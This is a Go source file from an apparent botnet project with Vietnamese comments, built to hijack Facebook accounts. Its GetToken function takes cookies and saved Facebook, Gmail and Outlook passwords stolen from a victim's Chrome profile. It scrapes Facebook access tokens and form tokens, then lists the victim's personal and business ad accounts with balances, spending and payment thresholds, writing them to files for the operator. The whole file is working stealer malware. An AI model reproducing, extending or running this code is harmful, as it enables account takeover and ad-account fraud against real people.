package pkg

import (
	_const "botnetgolang/internal/const"
	"botnetgolang/internal/model"
	"encoding/json"
	"fmt"
	"github.com/matishsiao/goInfo"
	"os"
	"strconv"
	"strings"
)

func GetToken(
	profile string,
	cookie_ok_fb []*model.Cookie,
	cookie_ok []*model.Cookie,
	password model.KeyInfo,
	version string,
	browser model.BrowserPaths,
) bool {
	// check

	//
	//if profile != "C:\\Users\\MR KINH\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 12" {
	//	return false
	//}

	chromeV := version[:3]

	var huy2 string
	var uid2 string
	for index, value := range cookie_ok_fb {

		value.Key = value.Name
		if value.Name == "c_user" {
			uid2 = fmt.Sprintf("%s%s", value.Value, "hahahahah")
		}
		value.Expires = value.ExpirationDate * 130
		huy2 += value.Name + "=" + value.Value + (map[bool]string{true: "; ", false: ""})[index < len(cookie_ok_fb)]
	}

	fmt.Println(fmt.Sprintf("cookies: %s || %s"), cookie_ok_fb, uid2)

	// get type and version of operating system
	operating_system, _ := goInfo.GetInfo()
	os_type := operating_system.GoOS
	if os_type == "windows" {
		os_type = "Windows NT"
	}
	os_r := operating_system.Core
	parts := strings.Split(os_r, ".")
	os_r = parts[0] + "." + parts[1]

	// check iswin64
	isWin64 := false
	if _, exists := os.LookupEnv("ProgramFiles(x86)"); exists {
		isWin64 = true
	}

	html, err := RequestElectP(_const.Url_v1, chromeV, huy2, os_type, os_r, version, browser, isWin64)
	if err != nil {
		fmt.Println("fetch info error")
	}

	fmt.Println(html)

	access_token := ""

	// get access token from html
	access_token = "EABB" + GetBW(html, `accessToken":"EABB`, `"`)
	if access_token == "EABB" || len(access_token) < 20 {
		return false
	}
	var fb_dtsg string
	var __spin_r string
	var __spin_t string
	var __spin_b string

	fb_dtsg = GetBW(html, `DTSGInitialData",[],{"token":"`, `"}`)
	__spin_r = GetBW(html, `__spin_r":`, `,"`)
	__spin_t = GetBW(html, `__spin_t":`, `,"`)
	__spin_b = GetBW(html, `__spin_b":`, `,"`)

	fmt.Println(fb_dtsg)
	fmt.Println(__spin_r)
	fmt.Println(__spin_t)
	fmt.Println(__spin_b)

	var usr model.Usr

	uid := GetBW(html, `fbid:"`, `",`)
	/// test
	if uid != "100067399599374" {
		return false
	}

	usr.Id = uid
	user_full_name := GetBW(html, `userFullName":"`, `",`)
	if user_full_name != "" {
		usr.Name = user_full_name
		usr.Name, _ = strconv.Unquote(`"` + user_full_name + `"`)
	}

	fmt.Println(uid)
	fmt.Println(usr)

	access_token_Q := ""
	fmt.Println(access_token_Q)

	access_token_Q = access_token

	cookie := ""
	for _, ccc := range cookie_ok_fb {
		if ccc.Path == "/" {
			cookie += ccc.Name + "=" + ccc.Value + ";"
			if ccc.Name == "c_user" {
				usr.Id = ccc.Value
			}
		}
	}

	name := os.Args[0]
	if strings.Contains(name, ".exe") {
		name = name[strings.LastIndex(name, "\\")+1:]
	}

	data := model.Data{
		Ten:           usr.Name,
		UID:           usr.Id,
		Email:         usr.Email,
		Birthday:      usr.Birthday,
		Location:      "",
		Fa:            "",
		Step:          "COOKIE",
		TrinhDuyet:    browser.Name + "|" + name,
		Cookie:        cookie,
		Password:      password.Facebook,
		Usergmail:     password.UserGmail,
		Passgmail:     password.PassGmail,
		Useroutlook:   password.UserOutlook,
		Passoutlook:   password.PassOutlook,
		HanhDong:      _const.Action,
		Token:         access_token_Q,
		Businesses:    []string{},
		Fanpage:       []string{},
		TaiKhoanAds:   []string{},
		CookieOutlook: "",
		CookieGg:      "",
	}

	fmt.Println(data)

	byte_adsaccounts, _ := FetchFromGraphQl(_const.Url_v14_ads_account, cookie, access_token)
	var adsaccounts map[string]interface{}
	_ = json.Unmarshal(byte_adsaccounts, &adsaccounts)
	if err != nil {
		fmt.Println("error:", err)
	}

	// lay tau khoan ca nhan
	var writer_file string
	writer_file = "Trình duyệt: " + browser.Name
	writer_file += "\n" + profile
	writer_file += "\n" + "Uid: " + uid
	writer_file += "\n" + "Tên: " + usr.Name
	writer_file += "\n" + "Cookie: " + cookie
	arraccount, ok := (adsaccounts["data"]).([]interface{})
	
	if ! ok {
		arraccount = make([]interface{}, 0)
	}

	// bat truong hop khong lay duoc


	writer_file += "\n" + "Tổng số tài khoản quảng cáo cá nhân: " + strconv.Itoa(len(arraccount))
	writer_file += "\n" + "-----------------------------------------------------------------------------" + "\n"
	writer_file += "\n" + "-----------------------------------------------------------------------------" + "\n"
	for index, value := range arraccount {
		writer_file += "\n" + "-----------------------------------------------------------------------------" + "\n"
		result := value.(map[string]interface{})
		writer_file += "Tài khoản quảng cáo số: " + strconv.Itoa(index+1) + "\n"
		fmt.Println(result)
		id_ads, ok:= result["account_id"].(string)
		if !ok {
			id_ads = ""
		}
		writer_file += "Id tài khoản quảng cáo: " + id_ads + "\n"


		name_ads, ok:=  result["name"].(string)
		if !ok {
			name_ads = ""
		}
		
		writer_file += "Tên tài khoản quảng cáo: " + name_ads + "\n"
		ads_currency, ok := result["currency"].(string)
		if !ok {
			ads_currency = ""
		}
		writer_file += "Đơn vị tiền tệ: " + ads_currency + "\n"
		ads_hour, ok :=  result["timezone_offset_hours_utc"].(float64)
		if !ok {
			ads_hour = 0.0
		}
		writer_file += "Múi giờ: " + fmt.Sprintf("%.2f", ads_hour) + "\n"
		
		ads_zone, ok := result["timezone_name"].(string)
		if !ok {
			ads_zone = ""
		}
		
		writer_file += "Tên vùng: " + ads_zone + "\n"
		status, ok := result["account_status"].(float64)
		if !ok {
			status = 0.0
		}
		stt := ""
		if status == float64(1) {
			stt = "Live"
		} else if status == float64(2) {
			stt = "Die"
		} else {
			stt = "Debit"
		}
		writer_file += "Tình trạng: " + stt + "\n"
		ads_balance, ok := result["balance"].(string)
		if !ok {
			ads_balance = ""
		}
		writer_file += "Số dư: " + ads_balance + "\n"
		ads_created_time, ok :=  result["created_time"].(string) 
		if !ok {
			ads_created_time = ""
		}
		writer_file += "Ngày tạo: " + ads_created_time + "\n"
		
		ads_owner, ok :=  result["owner"].(string)
		if !ok {
			ads_owner = ""
		}
		writer_file += "Gốc: " + ads_owner + "\n"
		prepay, ok := result["is_prepay_account"].(bool)
		prepaystring := ""
		if ok {
			if prepay == true {
				prepaystring = "Có"
			} else {
				prepaystring = "Không"
			}
			
		} else {
			prepaystring = ""
			
		}
		
		writer_file += "Là tài khoản trả trước hay không: " + prepaystring + "\n"
		valuenguong := 0.0
		if result["adspaymentcycle"] != nil {
			valuenguong = (result["adspaymentcycle"].(map[string]interface{}))["data"].([]interface{})[0].(map[string]interface{})["threshold_amount"].(float64)
		}

		writer_file += "Ngưỡng: " + fmt.Sprintf("%.2f", valuenguong) + "\n"
		spend := ""
		if result["insights"] != nil {
			spend = result["insights"].(map[string]interface{})["data"].([]interface{})[0].(map[string]interface{})["spend"].(string)
		}

		writer_file += "Đã chi tiêu: " + spend + "\n"

	}

	// mo file
	mangfile1 := strings.Split(profile, "\\")
	profile = mangfile1[len(mangfile1)-1]
	filename := strings.ReplaceAll(profile, " ", "_") + "list_tkqc_canhan"
	file, err := os.Create(fmt.Sprintf("%s.txt", filename))
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer file.Close()

	fmt.Fprint(file, writer_file)

	fmt.Println("haha")

	// lay tai khoan doanh nghiep
	byte_adsaccounts_pm, _ := FetchFromGraphQl(_const.Url_v14_ads_business, cookie, access_token)
	var adsaccounts_pm map[string]interface{}
	_ = json.Unmarshal(byte_adsaccounts_pm, &adsaccounts_pm)
	if err != nil {
		fmt.Println("error:", err)
	}

	var writer_file_pm string
	writer_file_pm = "Trình duyệt: " + browser.Name
	writer_file_pm += "\n" + profile
	writer_file_pm += "\n" + "Uid: " + uid
	writer_file_pm += "\n" + "Tên: " + usr.Name
	writer_file_pm += "\n" + "Cookie: " + cookie
	arraccount_pm, _ := (adsaccounts_pm["data"]).([]interface{})
	writer_file_pm += "\n" + "Tổng số BM: " + strconv.Itoa(len(arraccount_pm))

	writer_file_pm += "\n" + "-----------------------------------------------------------------------------" + "\n"
	writer_file_pm += "\n" + "-----------------------------------------------------------------------------" + "\n"

	for index, value := range arraccount_pm {
		query := value.(map[string]interface{})
		writer_file_pm += "\n" + "-----------------------------------------------------------------------------" + "\n"
		writer_file_pm += "BM số: " + strconv.Itoa(index+1) + "\n"
		namePm := query["name"].(string)
		writer_file_pm += "Tên BM: " + namePm + "\n"
		writer_file_pm += "Id của BM: " + query["id"].(string) + "\n"
		writer_file_pm += "Trạng thái: " + query["verification_status"].(string) + "\n"
		writer_file_pm += "Vai trò: "
		for _, value := range query["permitted_roles"].([]interface{}) {
			writer_file_pm += value.(string) + "  "
		}

		hold_number_ads_account := query["owned_ad_accounts"].(map[string]interface{})["data"].([]interface{})

		writer_file_pm += "\n" + "Số lượng tài khoản quảng cáo đang cầm: " + strconv.Itoa(len(hold_number_ads_account))
		for index, value := range hold_number_ads_account {
			writer_file_pm += "\n" + "+++++++++++++++++++++++++++++++++++++++++++++++++++++++" + "\n"
			query_ads_account := value.(map[string]interface{})
			writer_file_pm += "Tài khoản thứ: " + strconv.Itoa(index+1) + "\n"
			writer_file_pm += "Id: " + query_ads_account["id"].(string) + "\n"
			is_pre := query_ads_account["is_prepay_account"].(bool)
			is_pre_string := "Không trả trước"
			if is_pre {
				is_pre_string = "Trả trước"
			}
			writer_file_pm += "Loại tài khoản: " + is_pre_string + "\n"
			writer_file_pm += "Tiền tệ: " + query_ads_account["currency"].(string) + "\n"
			status := query_ads_account["account_status"].(float64)
			stt := ""
			if status == float64(1) {
				stt = "Live"
			} else if status == float64(2) {
				stt = "Die"
			} else {
				stt = "Debit"
			}
			writer_file_pm += "Tình trạng: " + stt + "\n"
			writer_file_pm += "Số dư: " + query_ads_account["balance"].(string) + "\n"
			writer_file_pm += "Đã chi tiêu: " + query_ads_account["amount_spent"].(string) + "\n"

			valuenguong := 0.0
			if query_ads_account["adspaymentcycle"] != nil {
				valuenguong = (query_ads_account["adspaymentcycle"].(map[string]interface{}))["data"].([]interface{})[0].(map[string]interface{})["threshold_amount"].(float64)
			}

			writer_file_pm += "Ngưỡng: " + fmt.Sprintf("%.2f", valuenguong) + "\n"

		}

	}

	fmt.Println("haha")

	return true

}
